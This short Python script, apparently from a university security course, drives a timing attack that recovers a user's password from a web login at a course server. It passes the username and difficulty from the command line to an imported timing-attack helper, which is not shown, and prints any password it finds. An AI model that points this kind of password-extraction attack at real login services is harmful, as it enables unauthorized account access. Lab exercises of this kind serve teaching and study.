import sys
import Utils

# levels = [i for i in range(1, 10)]
# users = ['avivams']

# for lvl in levels:
#     for usr in users:
# if len(sys.argv) == 3:
#
difficulty = sys.argv[2]
username = sys.argv[1]
try:

    start_url = f"http://aoi.ise.bgu.ac.il/?user={username}&password="
    end_url = f"&difficulty={difficulty}"

    password = Utils.timing_attack(start_url=start_url, end_url=end_url)

    if password and len(password) > 0:
        print(f"[main][{username}][{difficulty}]: {password}")

except Exception as e:
    print(e)
